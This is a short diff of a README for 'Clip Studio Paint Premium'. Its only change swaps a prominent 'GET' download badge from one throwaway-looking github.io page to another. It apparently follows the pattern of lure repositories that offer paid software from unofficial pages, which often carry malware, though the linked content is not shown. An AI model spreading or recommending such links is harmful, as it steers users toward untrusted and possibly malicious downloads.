@@ -1,6 +1,6 @@
 # Clip Studio Paint Premium - Digital Art Suite for Illustration, Comics, and Animation
 
-[![GET Clip Studio Paint Premium](https://img.shields.io/badge/GET%20%E2%80%94%20Clip%20Studio%20Paint%20Premium-0078D6?style=for-the-badge&logoColor=white)](https://hugogooddeoq.github.io/.github/clip-studio-paint)
+[![GET Clip Studio Paint Premium](https://img.shields.io/badge/GET%20%E2%80%94%20Clip%20Studio%20Paint%20Premium-0078D6?style=for-the-badge&logoColor=white)](https://damirbeardniuj.github.io/.github/clip-studio-paint)
 
 ## Creative Suite Overview
 
